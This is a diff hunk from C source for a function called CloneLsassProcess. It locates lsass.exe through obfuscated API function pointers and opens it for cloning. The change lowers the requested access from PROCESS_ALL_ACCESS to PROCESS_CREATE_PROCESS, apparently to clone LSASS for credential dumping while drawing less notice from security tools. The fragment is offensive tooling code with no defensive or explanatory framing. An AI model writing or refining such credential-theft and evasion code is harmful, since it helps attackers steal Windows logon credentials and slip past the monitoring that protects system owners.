@@ -19,7 +19,7 @@ HANDLE CloneLsassProcess() {
     if (pP32F(hSnapshot, &pe)) {
         do {
             if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
-                hLsass = pOP(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                hLsass = pOP(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                 break;
             }
         } while (pP32N(hSnapshot, &pe));
